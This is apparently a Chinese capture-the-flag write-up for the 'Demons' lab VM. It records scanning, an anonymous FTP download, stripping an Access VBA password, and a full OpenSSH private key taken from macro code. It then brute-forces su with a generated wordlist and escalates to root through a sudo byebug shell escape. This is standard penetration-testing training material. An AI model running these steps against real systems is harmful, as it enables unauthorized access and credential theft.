# 信息搜集
主机发现

```clike
┌──(kali㉿kali)-[~]
└─$ nmap -sn 192.168.21.0/24   
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-03-27 23:38 EDT
Nmap scan report for 192.168.21.1 (192.168.21.1)
Host is up (0.0016s latency).
MAC Address: CC:E0:DA:EB:34:A2 (Baidu Online Network Technology (Beijing))
Nmap scan report for 192.168.21.2 (192.168.21.2)
Host is up (0.000068s latency).
MAC Address: 04:6C:59:BD:33:50 (Intel Corporate)
Nmap scan report for 192.168.21.3 (192.168.21.3)
Host is up (0.062s latency).
MAC Address: 72:10:25:EC:4F:8C (Unknown)
Nmap scan report for 192.168.21.8 (192.168.21.8)
Host is up (0.00037s latency).
MAC Address: 08:00:27:12:4D:75 (Oracle VirtualBox virtual NIC)
Nmap scan report for 192.168.21.11 (192.168.21.11)
Host is up.
Nmap done: 256 IP addresses (5 hosts up) scanned in 2.41 seconds
```
端口扫描

```clike
┌──(kali㉿kali)-[~]
└─$ nmap --min-rate 10000 -p- 192.168.21.8
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-03-27 23:39 EDT
Nmap scan report for 192.168.21.8 (192.168.21.8)
Host is up (0.000068s latency).
Not shown: 65532 closed tcp ports (reset)
PORT   STATE SERVICE
21/tcp open  ftp
22/tcp open  ssh
80/tcp open  http
MAC Address: 08:00:27:12:4D:75 (Oracle VirtualBox virtual NIC)

Nmap done: 1 IP address (1 host up) scanned in 1.85 seconds
┌──(kali㉿kali)-[~]
└─$ nmap -sT -sV -O -p21,22,80 192.168.21.8
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-03-27 23:39 EDT
Nmap scan report for 192.168.21.8 (192.168.21.8)
Host is up (0.00030s latency).

PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
22/tcp open  ssh     OpenSSH 8.4p1 Debian 5 (protocol 2.0)
80/tcp open  http    Apache httpd 2.4.48 ((Debian))
MAC Address: 08:00:27:12:4D:75 (Oracle VirtualBox virtual NIC)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running: Linux 4.X|5.X
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
OS details: Linux 4.15 - 5.8
Network Distance: 1 hop
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 7.59 seconds
```

# 漏洞利用
看一下80端口

![输入图片说明](image/5cebdb5c1bdb4fb3946dc5bc25980f6c.png)

![输入图片说明](image/0d19ca8a87094c489afe50766fcf76f0.png)

目录扫描
```clike
┌──(kali㉿kali)-[~]
└─$ gobuster dir -u http://192.168.21.8 -w SecLists/Discovery/Web-Content/directory-list-lowercase-2.3-big.txt -x html,php,txt,jpg,png,zip,git
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.21.8
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                SecLists/Discovery/Web-Content/directory-list-lowercase-2.3-big.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              png,zip,git,html,php,txt,jpg
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.html                (Status: 403) [Size: 277]
/index.html           (Status: 200) [Size: 442]
/manual               (Status: 301) [Size: 313] [--> http://192.168.21.8/manual/]                                               
/javascript           (Status: 301) [Size: 317] [--> http://192.168.21.8/javascript/]                                           
/hell                 (Status: 301) [Size: 311] [--> http://192.168.21.8/hell/]                                                 
/.html                (Status: 403) [Size: 277]
/server-status        (Status: 403) [Size: 277]
/logitech-quickcam_w0qqcatrefzc5qqfbdz1qqfclz3qqfposz95112qqfromzr14qqfrppz50qqfsclz1qqfsooz1qqfsopz1qqfssz0qqfstypez1qqftrtz1qqftrvz1qqftsz2qqnojsprzyqqpfidz0qqsaatcz1qqsacatzq2d1qqsacqyopzgeqqsacurz0qqsadisz200qqsaslopz1qqsofocuszbsqqsorefinesearchz1.html (Status: 403) [Size: 277]
Progress: 9482032 / 9482040 (100.00%)
===============================================================
Finished
===============================================================
```
/hell，两个图片下载下来

![输入图片说明](image/8d97b2392a5449b4bb54f8d4a06a2f43.png)

没发现什么，在扫一下/uryy
```clike
┌──(kali㉿kali)-[~]
└─$ gobuster dir -u http://192.168.21.8/uryy -w SecLists/Discovery/Web-Content/directory-list-lowercase-2.3-big.txt -x html,php,txt,jpg,png,zip,git
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.21.8/uryy
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                SecLists/Discovery/Web-Content/directory-list-lowercase-2.3-big.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              php,txt,jpg,png,zip,git,html
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
Progress: 9482032 / 9482040 (100.00%)
===============================================================
Finished
===============================================================
```
ftp可以匿名登录

```clike
┌──(kali㉿kali)-[~]
└─$ ftp 192.168.21.8             
Connected to 192.168.21.8.
220 (vsFTPd 3.0.3)
Name (192.168.21.8:kali): anonymous
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
```
发现有东西，下载下来

```clike
ftp> ls -la
229 Entering Extended Passive Mode (|||15845|)
150 Here comes the directory listing.
drwxr-xr-x    3 0        115          4096 Sep 16  2021 .
drwxr-xr-x    3 0        115          4096 Sep 16  2021 ..
drwxrwxrwx    2 0        0            4096 Sep 16  2021 .toolsHidden
226 Directory send OK.
ftp> cd .toolsHi
550 Failed to change directory.
ftp> cd .toolsHidden
250 Directory successfully changed.
ftp> ls -al
229 Entering Extended Passive Mode (|||65198|)
150 Here comes the directory listing.
drwxrwxrwx    2 0        0            4096 Sep 16  2021 .
drwxr-xr-x    3 0        115          4096 Sep 16  2021 ..
-rw-r--r--    1 0        0              55 Sep 10  2021 .what
-rw-------    1 1000     1000        12018 Sep 10  2021 DemonsCellsDogma.xlsx
-rwxrwxrwx    1 1000     1000       339968 Sep 16  2021 DemonsVBAMacroTools.mdb
226 Directory send OK.
ftp> get .what
local: .what remote: .what
229 Entering Extended Passive Mode (|||26476|)
150 Opening BINARY mode data connection for .what (55 bytes).
100% |*******************|    55      231.51 KiB/s    00:00 ETA
226 Transfer complete.
55 bytes received in 00:00 (81.25 KiB/s)
ftp> mget *
mget DemonsCellsDogma.xlsx [anpqy?]? 
229 Entering Extended Passive Mode (|||64549|)
550 Failed to open file.
mget DemonsVBAMacroTools.mdb [anpqy?]? 
229 Entering Extended Passive Mode (|||17200|)
150 Opening BINARY mode data connection for DemonsVBAMacroTools.mdb (339968 bytes).
100% |*******************|   332 KiB  182.65 MiB/s    00:00 ETA
226 Transfer complete.
339968 bytes received in 00:00 (160.10 MiB/s)
```
mdb文件有加密

![输入图片说明](image/7dd006743db24f3d99120576f27e66f6.png)

把DPB更改为DPX

![输入图片说明](image/eec55145da994e48aeee6d3ec93d85b0.png)

查看一下

```clike
Option Compare Database

Function KeyGood() As Boolean
    Dim KEY As String
    Dim NoKey As String

    KEY = "-----BEGIN OPENSSH PRI" + "VATE KEY-----"
    NoKey = "asdasdasdasdasdgfdgfdasdasdasdasdassdassdasdadasdasdadassdasdasdasda"
    KEY = "b3BlbnNzaC1rZXktdjEAAAAABG5vbm" + "UAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn"
    NoKey = "asdasdasdasdasdgfdgfdasdasdasdasdassdassdasdadasdasdadassdasdasdasda"
    KEY = "NhAAAAAwEAAQAAAYEA3rTgKevGlujADq2" + "T3T9SEEeh5TEZ10Fi+uHNCTJksuwg6jMKguuL"
    NoKey = "asdasdasdasdasdgfdgfdasdasdasdasdassdassdasdadasdasdadassdasdasdasda"
    KEY = "vq8OZAhRV0RazmzJASqayAlPEUh2dKQ" + "ctCOraBmzhDX0uhmG5twQsuSyERpLEixlw54RrT"
    NoKey = "asdasdasdasdasdgfdgfdasdasdasdasdassdassdasdadasdasdadassdasdasdasda"
    KEY = "J+SGcOQFJOCydnhnHKiQqNePEUoOdrO" + "3hBemlu4WSTzxaJZbaoxnC1XSzZ8ulYsTU4KcZL"
    NoKey = "asdasdasdasdasdgfdgfdasdasdasdasdassdassdasdadasdasdadassdasdasdasda"
    KEY = "6EoTARxVW7v+kP3lFr6zschqRfwrGTwh" + "7xeEj7PcZFVKuv1XzHWsAfiG/fxXpaVSM4PCqK"
    NoKey = "asdasdasdasdasdgfdgfdasdasdasdasdassdassdasdadasdasdadassdasdasdasda"
    KEY = "wvfsdjwZ6/ucuAOwSPFmpe6RRV2dDLF6q" + "wfvOsoMR6NttznX31dZWIXZgrAIdCSD3RtSk4"
    NoKey = "asdasdasdasdasdgfdgfdasdasdasdasdassdassdasdadasdasdadassdasdasdasda"
    KEY = "c+VDj5wu5okTxp6TVrp95DIjq9cdQfzjMJ" + "h9UL8bdEv+cBnEd0WJq4bfioQj19cDEdyDv1"
    NoKey = "asdasdasdasdasdgfdgfdasdasdasdasdassdassdasdadasdasdadassdasdasdasda"
    KEY = "6a6l5XsPjwYUv+lw6Bmj+a19jx/HC11O7VX" + "FGhXSFubLhcWPTx1RaIRLmQwg6B2du9CrcP"
    NoKey = "asdasdasdasdasdgfdgfdasdasdasdasdassdassdasdadasdasdadassdasdasdasda"
    KEY = "1Sctaaat3vSEKp+QbYk9IYmld3yrCTNvMhLV" + "INHhAAAFgMHGkD7BxpA+AAAAB3NzaC1yc2"
    NoKey = "asdasdasdasdasdgfdgfdasdasdasdasdassdassdasdadasdasdadassdasdasdasda"
    KEY = "EAAAGBAN604CnrxpbowA6tk90/UhBHoeUxGdd" + "BYvrhzQkyZLLsIOozCoLri76vDmQIUVdE"
    NoKey = "asdasdasdasdasdgfdgfdasdasdasdasdassdassdasdadasdasdadassdasdasdasda"
    KEY = "Ws5syQEqmsgJTxFIdnSkHLQjq2gZs4Q19LoZhu" + "bcELLkshEaSxIsZcOeEa0yfkhnDkBSTg"
    NoKey = "asdasdasdasdasdgfdgfdasdasdasdasdassdassdasdadasdasdadassdasdasdasda"
    KEY = "snZ4ZxyokKjXjxFKDnazt4QXppbuFkk88WiWW2q" + "MZwtV0s2fLpWLE1OCnGS+hKEwEcVVu7"
    NoKey = "asdasdasdasdasdgfdgfdasdasdasdasdassdassdasdadasdasdadassdasdasdasda"
    KEY = "/pD95Ra+s7HIakX8Kxk8Ie8XhI+z3GRVSrr9V8x1r" + "AH4hv38V6WlUjODwqisL37HY8Gev7"
    NoKey = "asdasdasdasdasdgfdgfdasdasdasdasdassdassdasdadasdasdadassdasdasdasda"
    KEY = "nLgDsEjxZqXukUVdnQ" + "yxeqsH7zrKDEejbbc5199XWViF2YKwCHQkg90bUpOHPlQ4+cLuaJ"
    NoKey = "asdasdasdasdasdgfdgfdasdasdasdasdassdassdasdadasdasdadassdasdasdasda"
    KEY = "E8aek1a6feQyI6vXHUH" + "84zCYfVC/G3RL/nAZxHdFiauG34qEI9fXAxHcg79emupeV7D48G"
    NoKey = "asdasdasdasdasdgfdgfdasdasdasdasdassdassdasdadasdasdadassdasdasdasda"
    KEY = "FL/pcOgZo/mtfY8fxwtdTu1VxRoV0hbmy4XFj0" + "8dUWiES5kMIOgdnbvQq3D9UnLWmmrd70"
    NoKey = "asdasdasdasdasdgfdgfdasdasdasdasdassdassdasdadasdasdadassdasdasdasda"
    KEY = "hCqfkG2JPSGJpXd8qwkzbzI" + "S1SDR4QAAAAMBAAEAAAGANIoNXDZwWke8j3npqUd377lGe1"
    NoKey = "asdasdasdasdasdgfdgfdasdasdasdasdassdassdasdadasdasdadassdasdasdasda"
    KEY = "BzHTIizLcabPIDiaZlOXsjHrG8/RZFWdoQfnr0xUA" + "qx2iqrUhs69HhiDDzSJglpuBxVl54"
    NoKey = "asdasdasdasdasdgfdgfdasdasdasdasdassdassdasdadasdasdadassdasdasdasda"
    KEY = "RrMg/TOriNilHZ3LW" + "hU5SMXwu6Bu5FvTo98G5GC+bpxHwL7Jk1+kkzUlOhlrsRpQe0IEEN"
    NoKey = "asdasdasdasdasdgfdgfdasdasdasdasdassdassdasdadasdasdadassdasdasdasda"
    KEY = "XrQiCufmo2jy22mTTtpJi+kDRk0f8vrpJlnMek" + "DcaoFg6VS/rQ/4O3EzP5eXNd5Zz0AIOS"
    NoKey = "asdasdasdasdasdgfdgfdasdasdasdasdassdassdasdadasdasdadassdasdasdasda"
    KEY = "prx/yw9zrd9Y0XCH" + "qN9wLWJP+LWm8H7OBlWpwra5xnHMkQmclYwcaoWHSQNsqNdYuMuRGv"
    NoKey = "asdasdasdasdasdgfdgfdasdasdasdasdassdassdasdadasdasdadassdasdasdasda"
    KEY = "4WoYiSEhDoyVmlgoOy1EZGRPiGMRrFX" + "vpEyJgWCPV2+67NZYGO7fbBEh4x5N10HniLE281"
    NoKey = "asdasdasdasdasdgfdgfdasdasdasdasdassdassdasdadasdasdadassdasdasdasda"
    KEY = "ivsb2LmLWT9KeCCcSZOqZ/oX" + "nN08KFqgs5Qn8XdxqUwf0BN8zWZXldiunfKM7tjm0vmMtx"
    NoKey = "asdasdasdasdasdgfdgfdasdasdasdasdassdassdasdadasdasdadassdasdasdasda"
    KEY = "uwUEwZNw7PfKtwPs5LO+7Pri5" + "tqQAP7D5+czSODi29FO8KNY/sPyFxkmpgwjgc6YRxAAAA"
    NoKey = "asdasdasdasdasdgfdgfdasdasdasdasdassdassdasdadasdasdadassdasdasdasda"
    KEY = "wQClr++3HMtdgzOM+I8LCsEHXE" + "RG7xs1BUFbP7vCHMAdHAwN+vaZBzX0Vshc2IlwSSUmGL"
    NoKey = "asdasdasdasdasdgfdgfdasdasdasdasdassdassdasdadasdasdadassdasdasdasda"
    KEY = "6aQGDCQzMlWB9bdDl5gtof5N6Ng" + "xESwUuBPBnfo2BsyWcnpQv1lEvwlKvdM4mAa8DxSXYZ"
    NoKey = "asdasdasdasdasdgfdgfdasdasdasdasdassdassdasdadasdasdadassdasdasdasda"
    KEY = "d6jMPwkzHLS70I6KIm05LbGk6XbY" + "3Vu4L5+icVlQz4krc/e/oH/kD1EtYCa8hYq4t/NBJi"
    NoKey = "asdasdasdasdasdgfdgfdasdasdasdasdassdassdasdadasdasdadassdasdasdasda"
    KEY = "On0p22jatd/dI4rX1riPNhymmJNMQ+X" + "9PGbteXfwuR1sWFvNIAAADBAPN3tlgMQ5IXdzAj"
    NoKey = "asdasdasdasdasdgfdgfdasdasdasdasdassdassdasdadasdasdadassdasdasdasda"
    KEY = "AfLjsSfWPuzdUmDA7InNVoYnQpmTDxlu61d1W3e3V1onObXuOJ8nomvwecW9pbV2ScV/M/"
    NoKey = "asdasdasdasdasdgfdgfdasdasdasdasdassdassdasdadasdasdadassdasdasdasda"
    KEY = "mZFRvK4KJ9YV1IX2zMWxHzQXuOU3GtUe" + "VpXKNIwsZ1XI37QvCSlGGbdktoKVsoiks7aXet"
    NoKey = "asdasdasdasdasdgfdgfdasdasdasdasdassdassdasdadasdasdadassdasdasdasda"
    KEY = "pS2i5YRNTAQNopbGfhu/I1VJvRtvdffEn" + "tS/jd11NsCrnuoRyrIhehtZ6LXB9MX/xbNJcj"
    NoKey = "asdasdasdasdasdgfdgfdasdasdasdasdassdassdasdadasdasdadassdasdasdasda"
    KEY = "O7y0aRp60NQKzoDNrODeya5tubJW9mZ" + "QAAAMEA6iuVtgwh7wJwg9hMO+URme9tLJx4dB0i"
    NoKey = "asdasdasdasdasdgfdgfdasdasdasdasdassdassdasdadasdasdadassdasdasdasda"
    KEY = "sxzf78xa7tTw6U1H5Y4aq6zksvOZkxvEc" + "kaM3oTnBgqkJvrhlg+85v7R9eRF+7BrJ6PvZ1"
    NoKey = "asdasdasdasdasdgfdgfdasdasdasdasdassdassdasdadasdasdadassdasdasdasda"
    KEY = "2QQGAyEtV12zeUaHMukj2g6cP40BPS" + "IDFeBGYJmABsF6rDjUprg2BDirLMdvMQITFgLDky"
    NoKey = "asdasdasdasdasdgfdgfdasdasdasdasdassdassdasdadasdasdadassdasdasdasda"
    KEY = "uD0QYIewqUy1MSIRqjY+3EF/hM+9TW1" + "LACumsfjeqf8XuVbpI7i0EMU6Me3VGmyaAnJPbP"
    NoKey = "asdasdasdasdasdgfdgfdasdasdasdasdassdassdasdadasdasdadassdasdasdasda"
    KEY = "v1x+/KC7YS6dfNAAAACmF" + "pbUBEZW1vbnM="
    NoKey = "asdasdasdasdasdgfdgfdasdasdasdasdassdassdasdadasdasdadassdasdasdasda"

    KEY = "-----END OPENSSH PR" + "IVATE KEY-----"
    NoKey = "asdasdasdasdasdgfdgfdasdasdasdasdassdassdasdadasdasdadassdasdasdasda"

End Function
```
看得出是一个密钥，把key保存下来，最后一段也
```clike
-----BEGIN OPENSSH PRIVATE KEY-----
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
v1x+/KC7YS6dfNAAAACmFpbUBEZW1vbnM=
-----END OPENSSH PRIVATE KEY-----
```
最后知道用户名是一开始找到的那两个图片名称：Aim

```clike
┌──(kali㉿kali)-[~]
└─$ ssh -i id_rsa aim@192.168.21.8
Last login: Tue Sep 14 16:04:33 2021 from 192.168.56.109
aim@Demons:~$
```
# 提权
user.txt

```clike
aim@Demons:~$ ls -la
total 368
drwxr-xr-x 4 aim  aim    4096 Sep 14  2021 .
drwxr-xr-x 4 root root   4096 Sep 10  2021 ..
-rw------- 1 aim  aim      88 Sep 14  2021 .bash_history
-rw-r--r-- 1 aim  aim     220 Sep 10  2021 .bash_logout
-rw-r--r-- 1 aim  aim    3526 Sep 10  2021 .bashrc
drwxr-xr-x 3 aim  aim    4096 Sep 10  2021 .local
-rw-r--r-- 1 aim  aim     807 Sep 10  2021 .profile
drwx------ 2 aim  aim    4096 Sep 10  2021 .ssh
-rwxr-xr-x 1 aim  aim  339881 Sep 14  2021 key8_8.jpg
-rw-r--r-- 1 aim  aim      14 Sep 11  2021 user.txt
aim@Demons:~$ cat user.txt
DemonsDontCry
```
看到还有个key8_8.jpg，根据图片内容和名称生成一个字典
```clike
┌──(kali㉿kali)-[~]
└─$ crunch 8 8 odfnm34 -o passwords.txt
Crunch will now generate the following amount of data: 51883209 bytes
49 MB
0 GB
0 TB
0 PB
Crunch will now generate the following number of lines: 5764801 

crunch: 100% completed generating output
```
太多了，筛选一下
```clike
┌──(kali㉿kali)-[~]
└─$ cat passwords.txt | grep 'd' | grep 'f' | grep 'm' | grep 'n' | grep 'o' | grep '3' | grep '4' > pass.txt
```
能发现还有一个用户
```clike
aim@Demons:~$ cat /etc/passwd | grep /bin/bash
root:x:0:0:root:/root:/bin/bash
agares:x:1000:1000:Agares,,,:/home/agares:/bin/bash
aim:x:1001:1001:,,,:/home/aim:/bin/bash
```
把字典和suForce上传一下

```clike
aim@Demons:~$ ./suForce.sh -u agares -w pass.txt 
            _____                          
 ___ _   _ |  ___|__  _ __ ___ ___   
/ __| | | || |_ / _ \| '__/ __/ _ \ 
\__ \ |_| ||  _| (_) | | | (_|  __/  
|___/\__,_||_|  \___/|_|  \___\___|  
───────────────────────────────────
 code: d4t4s3c     version: v1.0.0
───────────────────────────────────
🎯 Username | agares
📖 Wordlist | pass.txt
🔎 Status   | 35823/141120/25%/d3monf4m
💥 Password | d3monf4m
───────────────────────────────────
```
切换到agares

```clike
aim@Demons:~$ su agares
Password: 
agares@Demons:/home/aim$ id
uid=1000(agares) gid=1000(agares) gruppi=1000(agares),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),109(netdev),112(bluetooth)
```
查找可利用的地方

```clike
agares@Demons:/home/aim$ uname -a
Linux Demons 5.10.0-8-amd64 #1 SMP Debian 5.10.46-4 (2021-08-03) x86_64 GNU/Linux
agares@Demons:/home/aim$ sudo -l
[sudo] password di agares: 
Corrispondenza voci Defaults per agares su Demons:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

L'utente agares può eseguire i seguenti comandi su Demons:
    (ALL : ALL) /bin/byebug
agares@Demons:/home/aim$ find / -perm -u=s -type f 2>/dev/null
/usr/lib/openssh/ssh-keysign
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/bin/passwd
/usr/bin/gpasswd
/usr/bin/su
/usr/bin/chfn
/usr/bin/chsh
/usr/bin/umount
/usr/bin/sudo
/usr/bin/newgrp
/usr/bin/mount
agares@Demons:/home/aim$ /usr/sbin/getcap -r / 2>/dev/null
/usr/bin/ping cap_net_raw=ep
```

![输入图片说明](image/2193f602de7b45e895aadfa3a2252ac1.png)

提权

```clike
agares@Demons:/home/aim$ TF=$(mktemp)
agares@Demons:/home/aim$ echo 'system("/bin/bash")' > $TF
agares@Demons:/home/aim$ sudo /bin/byebug $TF

[1, 1] in /tmp/tmp.boVxU4i2ps
=> 1: system("/bin/bash")
(byebug) continue
root@Demons:/home/aim# id
uid=0(root) gid=0(root) gruppi=0(root)
```
root.txt

```clike
root@Demons:/home/aim# cd ~
root@Demons:~# ls -la
totale 36
drw-------  5 root root 4096 14 set  2021 .
drwxr-xr-x 18 root root 4096 10 set  2021 ..
-rw-------  1 root root    1 16 set  2021 .bash_history
-rw-r--r-x  1 root root  591 10 set  2021 .bashrc
drw-------  3 root root 4096 11 set  2021 .config
drwxr-xr-x  3 root root 4096 10 set  2021 .local
-rw-r--r-x  1 root root  161  9 lug  2019 .profile
-rw-r--r--  1 root root   26 14 set  2021 root.txt
drwx-----x  2 root root 4096 11 set  2021 .ssh
root@Demons:~# cat root.txt 
inTheDark_BeAlone_OrLAst!
```
